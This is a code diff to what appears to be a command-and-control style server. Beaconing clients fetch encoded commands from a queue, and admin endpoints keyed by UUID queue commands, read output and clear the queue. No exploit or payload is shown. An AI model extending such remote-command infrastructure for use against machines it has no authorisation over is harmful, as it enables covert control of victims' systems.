@@ -44,7 +44,7 @@ def ping(uuid: str):
 @app.get('/commands/<{uuid}>')
 def command(uuid: str):
     if len(command_list) > 0:
-        return Response(command_list[len(command_list) - 1])
+        return Response(encode(command_list[len(command_list) - 1]))
     else:
         return Response('')
 
@@ -63,8 +63,8 @@ def command_response(response: str):
 # Admin endpoints start here
 # (these are scary, don't allow access to these without an admin UUID)
 
-@app.get('/admin/send_command/<{admin_uuid}>{response}')
-def admin_send_command(admin_uuid: str, requested_command: str):
+@app.get('/admin/queue_command/<{admin_uuid}>{requested_command}')
+def admin_queue_command(admin_uuid: str, requested_command: str):
     if admin_uuid in admin_uuids:
         requested_command = encode(requested_command)
         command_list.insert(0, requested_command)
@@ -76,8 +76,17 @@ def admin_send_command(admin_uuid: str, requested_command: str):
 @app.get('/admin/view_command_output/<{admin_uuid}>{response}')
 def admin_view_command_output(admin_uuid: str, response: str):
     if admin_uuid in admin_uuids:
-        command_output = encode(command_list[0])
+        command_output = encode(response_list[0])
         return Response(command_output)
+    else:
+        return Response('Admin UUID Required')
+
+
+@app.get('/admin/clear_command_queue/<{admin_uuid}>')
+def clear_command_queue(admin_uuid: str):
+    if admin_uuid in admin_uuids:
+        command_list.clear()
+        return Response('')
     else:
         return Response('Admin UUID Required')
 
@@ -94,7 +103,7 @@ async def log_request(request: Request, call_next):
 
     logger.info(f'{ip}, {uuid}, {path}')
 
-    if uuid in valid_uuids:
+    if uuid in valid_uuids or uuid in admin_uuids:
         response = await call_next(request)
         return response
     else:
